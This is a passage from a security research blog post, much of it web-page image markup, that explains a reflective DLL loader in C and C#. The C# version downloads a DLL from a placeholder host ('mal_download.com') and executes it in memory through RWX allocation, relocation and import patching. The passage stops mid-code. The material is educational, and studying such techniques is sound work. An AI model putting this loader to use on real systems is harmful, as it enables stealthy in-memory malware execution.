https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig12_Nusbaum.png?w=927&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367426&amp;s=3777ab9d5d919e5f18b8d8a0bf7c3102 1.5x"><source type="image/webp" media="(min-width: 64rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig12_Nusbaum.png?w=1280&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367426&amp;s=15087933555dd66ace0ed0ebffc1e3d9, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig12_Nusbaum.png?w=927&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367426&amp;s=924f60535669c47b48536ff2ce9a5605 1.5x"><source type="image/webp" media="(min-width: 48rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig12_Nusbaum.png?w=1024&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367426&amp;s=08584f46cea06bb266f5f087eda6b5dd, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig12_Nusbaum.png?w=927&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367426&amp;s=3777ab9d5d919e5f18b8d8a0bf7c3102 1.5x"><source type="image/webp" media="(min-width: 48rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig12_Nusbaum.png?w=1024&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367426&amp;s=29f842ce76c841a2f7663f89453213d2, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig12_Nusbaum.png?w=927&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367426&amp;s=924f60535669c47b48536ff2ce9a5605 1.5x"><source type="image/webp" media="(min-width: 20rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig12_Nusbaum.png?w=720&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367426&amp;s=c45ce872e2289508b489231a4237398f, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig12_Nusbaum.png?w=927&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367426&amp;s=3777ab9d5d919e5f18b8d8a0bf7c3102 1.5x"><source type="image/webp" media="(min-width: 20rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig12_Nusbaum.png?w=720&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367426&amp;s=bff217896e8ffe84c1f9b0dc8b970e67, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig12_Nusbaum.png?w=927&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367426&amp;s=924f60535669c47b48536ff2ce9a5605 1.5x"><source type="image/webp" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig12_Nusbaum.png?w=320&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367426&amp;s=fd9698846cd9ba10bc66f1de782eec88, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig12_Nusbaum.png?w=480&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367426&amp;s=44afcfa621a68ecd6963ec6363aaba2b 1.5x"><source type="image/webp" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig12_Nusbaum.png?w=320&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367426&amp;s=dc94973d4a06ae608bcaab2e2379d268, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig12_Nusbaum.png?w=480&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367426&amp;s=66855d7c014c8bb6904dbe60d3b42e4a 1.5x"><img class="c-img opacity-0 transition-all duration-300" src="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig12_Nusbaum.png?w=320&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367426&amp;s=dc94973d4a06ae608bcaab2e2379d268" loading="lazy" x-data="image({mq1024:{width:618,height:808},mq768:{width:618,height:808},mq320:{width:618,height:808},DEFAULT:{width:320,height:418}})" :width="getSize()" :height="getSize('height')" alt="" width="618" height="808" style="opacity: 1;"></picture><figcaption class="c-caption font-mono text-xs">Figure 12 - Unpatched Import Table From Ghidra</figcaption></figure></div><p class="MsoNormal">Now, let’s look in X64Dbg at the patched memory after the reflective loader has been executed.</p><div class="my-p56 flex justify-start"><figure class="inline-block"><picture class=" inline-block"><source type="image/webp" media="(min-width: 64rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig13_Nusbaum.png?w=1280&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367427&amp;s=ea5397235a6ed023728d38b901e3b081, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig13_Nusbaum.png?w=876&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367427&amp;s=2f66455452bf619b6f1b659c5c007dc8 1.5x"><source type="image/webp" media="(min-width: 64rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig13_Nusbaum.png?w=1280&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367427&amp;s=0d68faf831f7e05110abcd2c348ef57d, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig13_Nusbaum.png?w=876&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367427&amp;s=0e3c7aa59049f804e732d73e254e6135 1.5x"><source type="image/webp" media="(min-width: 48rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig13_Nusbaum.png?w=1024&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367427&amp;s=e2af1e87521ce40ec03281e0233f098d, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig13_Nusbaum.png?w=876&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367427&amp;s=2f66455452bf619b6f1b659c5c007dc8 1.5x"><source type="image/webp" media="(min-width: 48rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig13_Nusbaum.png?w=1024&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367427&amp;s=9f776430c73d88acd0a4f4b13b46774e, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig13_Nusbaum.png?w=876&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367427&amp;s=0e3c7aa59049f804e732d73e254e6135 1.5x"><source type="image/webp" media="(min-width: 20rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig13_Nusbaum.png?w=720&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367427&amp;s=781c15ac5114e2054a332616f59bbe98, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig13_Nusbaum.png?w=876&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367427&amp;s=2f66455452bf619b6f1b659c5c007dc8 1.5x"><source type="image/webp" media="(min-width: 20rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig13_Nusbaum.png?w=720&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367427&amp;s=6569eee8b3a8fc89e5113096a988dd21, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig13_Nusbaum.png?w=876&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367427&amp;s=0e3c7aa59049f804e732d73e254e6135 1.5x"><source type="image/webp" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig13_Nusbaum.png?w=320&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367427&amp;s=65cf04d9d243dd5e7ebae39f4982d3cb, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig13_Nusbaum.png?w=480&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367427&amp;s=44e9bffa381632de818acacafdd29232 1.5x"><source type="image/webp" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig13_Nusbaum.png?w=320&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367427&amp;s=f26fc89273b80731ac603f43334575c4, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig13_Nusbaum.png?w=480&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367427&amp;s=c7c9f738a7185904c7ad22d17f0dc3ec 1.5x"><img class="c-img opacity-0 transition-all duration-300" src="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig13_Nusbaum.png?w=320&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367427&amp;s=f26fc89273b80731ac603f43334575c4" loading="lazy" x-data="image({mq1024:{width:584,height:606},mq768:{width:584,height:606},mq320:{width:584,height:606},DEFAULT:{width:320,height:332}})" :width="getSize()" :height="getSize('height')" alt="" width="584" height="606" style="opacity: 1;"></picture><figcaption class="c-caption font-mono text-xs">Figure 13 - Patched Import Table From X64Dbg</figcaption></figure></div><p class="MsoListParagraphCxSpFirst">-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Line 138: Calculates the Entry address or DLLMain for the DLL based on the OptionalHeader and the memory address. Save this address as a function pointer with three (3) parameters, since DLLMain takes three paramters. AddressOfEntryPoint is shown in Red in Figure 13.</p><p class="MsoListParagraphCxSpLast">-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Line 140: Call the function point with the needed arguments to execute the malicious payload.</p><pre><code data-highlighted="yes" class="hljs language-makefile"><span class="hljs-section">0137:     // execute the loaded DLL</span>
<span class="hljs-section">0138:     void (*DLLEntry)(HINSTANCE, DWORD,</span>
<span class="hljs-section">0139:                      LPVOID) = (DWORD_PTR)dllBase + ntHeaders-&gt;OptionalHeader.AddressOfEntryPoint;</span>
<span class="hljs-section">0140:     (*DLLEntry)((HINSTANCE)dllBase, DLL_PROCESS_ATTACH, 0);</span>
<span class="hljs-section">0141: </span>
<span class="hljs-section">0142:     return 0;</span>
<span class="hljs-section">0143: }</span>
<span class="hljs-section">0271:     return 0;</span></code></pre><div class="my-p56 flex justify-start"><figure class="inline-block"><picture class=" inline-block"><source type="image/webp" media="(min-width: 64rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig14_Nusbaum.png?w=1280&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367429&amp;s=ab1991a6246ee1ed4514b46b02bc9ba7, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig14_Nusbaum.png?w=1404&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367429&amp;s=ffa26edd9ca065e996ecbbbe6b7643cd 1.5x"><source type="image/webp" media="(min-width: 64rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig14_Nusbaum.png?w=1280&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367429&amp;s=e629addfc27ab5aa2ac8c11faf19e7bd, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig14_Nusbaum.png?w=1404&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367429&amp;s=f717109c5c535db9f3ba6b22b03af0e0 1.5x"><source type="image/webp" media="(min-width: 48rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig14_Nusbaum.png?w=1024&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367429&amp;s=1dfc82ef587155f64eb0777ae188159c, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig14_Nusbaum.png?w=1404&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367429&amp;s=ffa26edd9ca065e996ecbbbe6b7643cd 1.5x"><source type="image/webp" media="(min-width: 48rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig14_Nusbaum.png?w=1024&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367429&amp;s=d25e4d738522fd9ab1e6fd77f95e8f44, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig14_Nusbaum.png?w=1404&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367429&amp;s=f717109c5c535db9f3ba6b22b03af0e0 1.5x"><source type="image/webp" media="(min-width: 20rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig14_Nusbaum.png?w=720&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367429&amp;s=18d4f4a3af43fbd3a7cd964827e50655, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig14_Nusbaum.png?w=1080&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367429&amp;s=62982005847f803df64f8fa5a9d7c30c 1.5x"><source type="image/webp" media="(min-width: 20rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig14_Nusbaum.png?w=720&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367429&amp;s=366e44d8a4905993afec8bf2bc4198e6, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig14_Nusbaum.png?w=1080&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367429&amp;s=1e926c1ce31de1d5640723adb85bb037 1.5x"><source type="image/webp" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig14_Nusbaum.png?w=320&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367429&amp;s=98b5eee4ee05b447a45f8d30600ddc86, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig14_Nusbaum.png?w=479&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367429&amp;s=2264be245d4dca068d790f1b5de8db7d 1.5x"><source type="image/webp" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig14_Nusbaum.png?w=320&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367429&amp;s=3a9a8e6af995dead091e629c31fb6492, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig14_Nusbaum.png?w=479&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367429&amp;s=62cc3903d791b3615463398c81abf4f2 1.5x"><img class="c-img opacity-0 transition-all duration-300" src="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig14_Nusbaum.png?w=320&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367429&amp;s=3a9a8e6af995dead091e629c31fb6492" loading="lazy" x-data="image({mq1024:{width:936,height:320},mq768:{width:936,height:320},mq320:{width:720,height:246},DEFAULT:{width:319,height:109}})" :width="getSize()" :height="getSize('height')" alt="" width="936" height="320" style="opacity: 1;"></picture><figcaption class="c-caption font-mono text-xs">Figure 14 - PE Header Determine the EntryPoint</figcaption></figure></div><p class="MsoNormal">The next code excerpt is in C# and performs the same actions as the C code above. We not going to walk through the C# code line by line this time. It’s almost a direct port of the C code. The C# code is wrapped in an unsafe tag, which allows us to use memory unsafe direct pointers. The main difference between the two code samples is that we needed to define each of the structures, and we had to do typecasting.</p><p class="MsoNormal">The following code is divided into groups to match those from the C section.</p><p class="MsoNormal">Main Class</p><pre><code data-highlighted="yes" class="hljs language-java">    <span class="hljs-number">10</span>	unsafe <span class="hljs-keyword">class</span> <span class="hljs-title class_">Program</span>
    <span class="hljs-number">11</span>	{
….
   <span class="hljs-number">214</span>	  <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Main</span><span class="hljs-params">(string[] args)</span>
   <span class="hljs-number">215</span>	  {
   <span class="hljs-number">216</span>	    <span class="hljs-type">byte</span>[] dllBytes;
   <span class="hljs-number">217</span>	    dllBytes =
   <span class="hljs-number">218</span>	        DownloadToBuffer(<span class="hljs-string">"http://mal_download.com/spawn_calc.dll"</span>);
   <span class="hljs-number">219</span>	    reflective_loader(dllBytes);
   <span class="hljs-number">220</span>	  }
   <span class="hljs-number">221</span>	}&nbsp;</code></pre><p class="MsoNormal">The reflective_loader function differs in that the input was a memory-safe byte[] and was then copied to a new unsafe memory location.</p><pre><code data-highlighted="yes" class="hljs language-csharp"><span class="hljs-number">38</span>	  <span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">reflective_loader</span>(<span class="hljs-params"><span class="hljs-built_in">byte</span>[] dllBytes</span>)
    39</span>	  {
    <span class="hljs-number">40</span>	    <span class="hljs-keyword">void</span> *buffer =  Win32.VirtualAlloc(IntPtr.Zero,
    <span class="hljs-number">41</span>	                                       (<span class="hljs-built_in">uint</span>)dllBytes.Length,
    <span class="hljs-number">42</span>	                                       (<span class="hljs-built_in">uint</span>)(Win32.AllocationTypeFlags.MEM_RESERVE |
    <span class="hljs-number">43</span>	                                         Win32.AllocationTypeFlags.MEM_COMMIT),
    <span class="hljs-number">44</span>	                                       (<span class="hljs-built_in">uint</span>)Win32.MemoryProtectFlags.PAGE_READWRITE);
    <span class="hljs-number">45</span>	    <span class="hljs-keyword">if</span>(buffer ==  <span class="hljs-literal">null</span>)
    <span class="hljs-number">46</span>	    {
    <span class="hljs-number">47</span>	      Console.WriteLine(<span class="hljs-string">"Error not alloced correctly {0:x}"</span>,
    <span class="hljs-number">48</span>	                        Win32.GetLastError());
    <span class="hljs-number">49</span>	      <span class="hljs-keyword">return</span>;
    <span class="hljs-number">50</span>	    }
    <span class="hljs-number">51</span>	    <span class="hljs-keyword">fixed</span>(<span class="hljs-built_in">byte</span> *p = dllBytes)
    <span class="hljs-number">52</span>	    {
    <span class="hljs-number">53</span>	      UIntPtr buffer_sz = <span class="hljs-keyword">new</span> UIntPtr((<span class="hljs-built_in">ulong</span>)dllBytes.Length);
    <span class="hljs-number">54</span>	      Win32.memcpy(buffer, p, buffer_sz);
    <span class="hljs-number">55</span>	    }
    <span class="hljs-number">56</span>	
    <span class="hljs-number">57</span>	    Win32.IMAGE_DOS_HEADER *dosHeaders = (Win32.IMAGE_DOS_HEADER *)
    <span class="hljs-number">58</span>	                                         buffer;
    <span class="hljs-number">59</span>	    Win32.IMAGE_NT_HEADERS64 *ntHeaders = (Win32.IMAGE_NT_HEADERS64 *)
    <span class="hljs-number">60</span>	                                          ((
    <span class="hljs-number">61</span>	                                              <span class="hljs-built_in">byte</span> *)buffer + dosHeaders-&gt;e_lfanew);
    <span class="hljs-number">62</span>	
    <span class="hljs-number">63</span>	    <span class="hljs-keyword">if</span>(ntHeaders-&gt;FileHeader.Machine == (<span class="hljs-built_in">ushort</span>)
    <span class="hljs-number">64</span>	        Win32.CHIPARCH.IMAGE_FILE_MACHINE_I386)
    <span class="hljs-number">65</span>	    {
    <span class="hljs-number">66</span>	      Console.WriteLine(<span class="hljs-string">"Invalid DLL version. Only supports x64"</span>);
    <span class="hljs-number">67</span>	      <span class="hljs-keyword">return</span>;
    <span class="hljs-number">68</span>	    }
    <span class="hljs-number">69</span>	</code></pre><p class="MsoNormal">Allocate the final memory unsafe allocation that will hold the final DLL with the Read, Write, and execute permissions.</p><pre><code data-highlighted="yes" class="hljs language-csharp"><span class="hljs-number">70</span>	    <span class="hljs-built_in">uint</span> dllImageSize = ntHeaders-&gt;OptionalHeader.SizeOfImage;
    <span class="hljs-number">71</span>	
    <span class="hljs-number">72</span>	    <span class="hljs-comment">// allocate new memory space for the DLL. Try to allocate memory in the image's preferred base address, but don't stress if the memory is allocated elsewhere</span>
    <span class="hljs-number">73</span>	    <span class="hljs-keyword">void</span> *dllBase = Win32.VirtualAlloc((IntPtr)
    <span class="hljs-number">74</span>	                                       ntHeaders-&gt;OptionalHeader.ImageBase,
    <span class="hljs-number">75</span>	                                       dllImageSize, (<span class="hljs-built_in">uint</span>)(Win32.AllocationTypeFlags.MEM_RESERVE |
    <span class="hljs-number">76</span>	                                         Win32.AllocationTypeFlags.MEM_COMMIT),
    <span class="hljs-number">77</span>	                                       (<span class="hljs-built_in">uint</span>)Win32.MemoryProtectFlags.PAGE_EXECUTE_READWRITE);
    <span class="hljs-number">78</span>	    <span class="hljs-keyword">if</span>(dllBase ==  <span class="hljs-literal">null</span>)
    <span class="hljs-number">79</span>	    {
    <span class="hljs-number">80</span>	      Console.WriteLine(<span class="hljs-string">"Error not alloced correctly {0:x}"</span>,
    <span class="hljs-number">81</span>	                        Win32.GetLastError());
    <span class="hljs-number">82</span>	      <span class="hljs-keyword">return</span>;
    <span class="hljs-number">83</span>	    }
    <span class="hljs-number">84</span>	    Console.WriteLine(<span class="hljs-string">"Memory location 0x{0:X}"</span>,
    <span class="hljs-number">85</span>	                      (<span class="hljs-built_in">ulong</span>)((<span class="hljs-built_in">byte</span> *)dllBase));
    <span class="hljs-number">86</span>	
    <span class="hljs-number">87</span>	    <span class="hljs-comment">// get delta between this module's image base and the DLL that was read into memory</span>
    <span class="hljs-number">88</span>	    <span class="hljs-built_in">ulong</span> deltaImageBase = (<span class="hljs-built_in">ulong</span>)&amp;dllBase -
    <span class="hljs-number">89</span>	                           ntHeaders-&gt;OptionalHeader.ImageBase;
    <span class="hljs-number">90</span>	
    <span class="hljs-number">91</span>	    <span class="hljs-comment">// copy over DLL image headers to the newly allocated space for the DLL</span>
    <span class="hljs-number">92</span>	    Win32.memcpy(dllBase, buffer,
    <span class="hljs-number">93</span>	                 <span class="hljs-keyword">new</span> UIntPtr(ntHeaders-&gt;OptionalHeader.SizeOfHeaders));
    <span class="hljs-number">94</span>	</code></pre><p class="MsoNormal">&nbsp;Copy each section into the new memory buffer with the corrected offsets.&nbsp;</p><pre><code data-highlighted="yes" class="hljs language-csharp">    <span class="hljs-number">95</span>	    <span class="hljs-comment">// copy over DLL image sections to the newly allocated space for the DLL</span>
    <span class="hljs-number">96</span>	    Win32.IMAGE_SECTION_HEADER *section = IMAGE_FIRST_SECTION(
    <span class="hljs-number">97</span>	        ntHeaders);
    <span class="hljs-number">98</span>	    <span class="hljs-keyword">for</span>(<span class="hljs-built_in">uint</span> i = <span class="hljs-number">0</span>; i &lt; ntHeaders-&gt;FileHeader.NumberOfSections; i++)
    <span class="hljs-number">99</span>	    {
   <span class="hljs-number">100</span>	      <span class="hljs-keyword">void</span> *sectionDestination = (<span class="hljs-keyword">void</span> *)((<span class="hljs-built_in">byte</span> *)dllBase +
   <span class="hljs-number">101</span>	                                          section-&gt;VirtualAddress);
   <span class="hljs-number">102</span>	      <span class="hljs-keyword">void</span> *sectionBytes = (<span class="hljs-keyword">void</span> *)((<span class="hljs-built_in">byte</span> *)buffer +
   <span class="hljs-number">103</span>	                                    section-&gt;PointerToRawData);
   <span class="hljs-number">104</span>	      Win32.memcpy(sectionDestination, sectionBytes,
   <span class="hljs-number">105</span>	                   <span class="hljs-keyword">new</span> UIntPtr(section-&gt;SizeOfRawData));
   <span class="hljs-number">106</span>	      section++;
   <span class="hljs-number">107</span>	    }
   <span class="hljs-number">108</span>	&nbsp;</code></pre><p class="MsoNormal">Update all the Relocations with the new memory address.</p><pre><code data-highlighted="yes" class="hljs language-csharp"><span class="hljs-number">109</span>	    <span class="hljs-comment">// perform image base relocations</span>
   <span class="hljs-number">110</span>	    Win32.IMAGE_DATA_DIRECTORY relocations =
   <span class="hljs-number">111</span>	        ntHeaders-&gt;OptionalHeader.BaseRelocationTable;
   <span class="hljs-number">112</span>	    <span class="hljs-keyword">void</span> *relocationTable = relocations.VirtualAddress +
   <span class="hljs-number">113</span>	                            (<span class="hljs-built_in">byte</span> *)dllBase;
   <span class="hljs-number">114</span>	    <span class="hljs-built_in">uint</span> relocationsProcessed = <span class="hljs-number">0</span>;
   <span class="hljs-number">115</span>	
   <span class="hljs-number">116</span>	    <span class="hljs-comment">// TODO Test this wheile loop. Current sample doesnt have a relocation table</span>
   <span class="hljs-number">117</span>	    <span class="hljs-keyword">while</span>(relocationsProcessed &lt; relocations.Size)
   <span class="hljs-number">118</span>	    {
   <span class="hljs-number">119</span>	      Win32.BASE_RELOCATION_BLOCK *relocationBlock =
   <span class="hljs-number">120</span>	          (Win32.BASE_RELOCATION_BLOCK *)((
   <span class="hljs-number">121</span>	                                              <span class="hljs-built_in">byte</span> *)relocationTable + relocationsProcessed);
   <span class="hljs-number">122</span>	      relocationsProcessed += (<span class="hljs-built_in">uint</span>)<span class="hljs-keyword">sizeof</span>(Win32.BASE_RELOCATION_BLOCK);
   <span class="hljs-number">123</span>	      <span class="hljs-built_in">uint</span> relocationsCount = (<span class="hljs-built_in">uint</span>)((relocationBlock-&gt;BlockSize -
   <span class="hljs-number">124</span>	                                      <span class="hljs-keyword">sizeof</span>(
   <span class="hljs-number">125</span>	                                          Win32.BASE_RELOCATION_BLOCK)) / <span class="hljs-keyword">sizeof</span>(
   <span class="hljs-number">126</span>	                                         Win32.BASE_RELOCATION_ENTRY));
   <span class="hljs-number">127</span>	      Win32.BASE_RELOCATION_ENTRY *relocationEntries =
   <span class="hljs-number">128</span>	          (Win32.BASE_RELOCATION_ENTRY *)
   <span class="hljs-number">129</span>	          ((<span class="hljs-built_in">byte</span> *)relocationTable + relocationsProcessed);
   <span class="hljs-number">130</span>	
   <span class="hljs-number">131</span>	      <span class="hljs-keyword">for</span>(<span class="hljs-built_in">uint</span> i = <span class="hljs-number">0</span>; i &lt; relocationsCount; i++)
   <span class="hljs-number">132</span>	      {
   <span class="hljs-number">133</span>	        relocationsProcessed += (<span class="hljs-built_in">uint</span>)<span class="hljs-keyword">sizeof</span>(Win32.BASE_RELOCATION_ENTRY);
   <span class="hljs-number">134</span>	
   <span class="hljs-number">135</span>	        <span class="hljs-keyword">if</span>(relocationEntries[i].Type == <span class="hljs-number">0</span>)
   <span class="hljs-number">136</span>	        {
   <span class="hljs-number">137</span>	          <span class="hljs-keyword">continue</span>;
   <span class="hljs-number">138</span>	        }
   <span class="hljs-number">139</span>	
   <span class="hljs-number">140</span>	        <span class="hljs-built_in">uint</span> relocationRVA = relocationBlock-&gt;PageAddress +
   <span class="hljs-number">141</span>	                             relocationEntries[i].Offset;
   <span class="hljs-number">142</span>	        <span class="hljs-built_in">uint</span> addressToPatch = <span class="hljs-number">0</span>;
   <span class="hljs-number">143</span>	        IntPtr tmp = <span class="hljs-keyword">new</span> IntPtr(<span class="hljs-number">0</span>);
   <span class="hljs-number">144</span>	        Win32.ReadProcessMemory(Win32.GetCurrentProcess(),
   <span class="hljs-number">145</span>	                                <span class="hljs-keyword">new</span> IntPtr((<span class="hljs-built_in">byte</span> *)dllBase + relocationRVA),
   <span class="hljs-number">146</span>	                                <span class="hljs-keyword">new</span> IntPtr(&amp;addressToPatch),
   <span class="hljs-number">147</span>	                                <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">void</span> *), <span class="hljs-keyword">out</span> tmp);
   <span class="hljs-number">148</span>	        addressToPatch += (<span class="hljs-built_in">uint</span>)deltaImageBase;
   <span class="hljs-number">149</span>	        Win32.memcpy(((<span class="hljs-built_in">byte</span> *)dllBase + relocationRVA), &amp;addressToPatch,
   <span class="hljs-number">150</span>	                     <span class="hljs-keyword">new</span> UIntPtr((<span class="hljs-built_in">ulong</span>)<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">void</span> *)));
   <span class="hljs-number">151</span>	      }
   <span class="hljs-number">152</span>	    }
   <span class="hljs-number">153</span>	</code></pre><p class="MsoNormal">Load any dependencies using LoadLibrary and update the function pointers.</p><pre><code data-highlighted="yes" class="hljs language-java"><span class="hljs-number">154</span>	    <span class="hljs-comment">// resolve import address table</span>
   <span class="hljs-number">155</span>	    Win32.IMAGE_IMPORT_DESCRIPTOR *importDescriptor = <span class="hljs-literal">null</span>;
   <span class="hljs-number">156</span>	    Win32.IMAGE_DATA_DIRECTORY *importsDirectory =
   <span class="hljs-number">157</span>	        (Win32.IMAGE_DATA_DIRECTORY *)
   <span class="hljs-number">158</span>	        &amp;ntHeaders-&gt;OptionalHeader.ImportTable;
   <span class="hljs-number">159</span>	    importDescriptor = (Win32.IMAGE_IMPORT_DESCRIPTOR *)(
   <span class="hljs-number">160</span>	                           importsDirectory-&gt;VirtualAddress + (<span class="hljs-type">byte</span> *)dllBase);
